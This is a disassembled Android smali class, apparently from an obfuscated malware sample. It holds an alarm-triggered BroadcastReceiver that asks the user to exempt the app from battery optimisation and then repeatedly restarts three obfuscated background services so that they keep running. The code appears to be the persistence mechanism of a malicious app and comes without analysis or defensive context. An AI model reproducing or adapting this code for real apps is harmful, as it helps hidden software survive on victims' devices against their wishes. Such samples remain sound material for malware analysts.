.class public Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    return-void
.end method


# virtual methods
.method a(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {p2}, Lwocwvy/czyxoxmbauu/slsa/b;->a()Z

    move-result p2

    if-eqz p2, :cond_0

    return-void

    :cond_0
    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "ALARM"

    const-string v1, "START"

    invoke-virtual {p2, v0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x1a

    if-lt p2, v0, :cond_2

    const-string p2, "power"

    invoke-virtual {p1, p2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/os/PowerManager;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p2, v0}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result p2

    if-nez p2, :cond_1

    new-instance p2, Landroid/content/Intent;

    const-string v0, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p2, v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :cond_1
    :try_start_0
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p2

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Error"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ALARM 1 "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, v1, p2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_0
    :try_start_1
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception p2

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Error"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ALARM 2 "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, v1, p2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_1
    :try_start_2
    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-virtual {p2, p1, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p2

    if-nez p2, :cond_3

    new-instance p2, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    return-void

    :catch_2
    move-exception p1

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "Error"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    goto :goto_4

    :cond_2
    :try_start_3
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_2

    :catch_3
    move-exception p2

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Error"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ALARM 1 "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, v1, p2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_2
    :try_start_4
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/kldqwysgkfcrmq;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_3

    :catch_4
    move-exception p2

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Error"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ALARM 2 "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-virtual {v0, v1, p2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_3
    :try_start_5
    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-virtual {p2, p1, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result p2

    if-nez p2, :cond_3

    new-instance p2, Landroid/content/Intent;

    const-class v0, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, p2}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    return-void

    :catch_5
    move-exception p1

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v0, "Error"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    :goto_4
    const-string v2, "ALARM 3 "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, v0, p1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    invoke-virtual {p0, p1, p2}, Lwocwvy/czyxoxmbauu/slsa/pworotsvjdlioho/hwfe;->a(Landroid/content/Context;Landroid/content/Intent;)V

    return-void
.end method
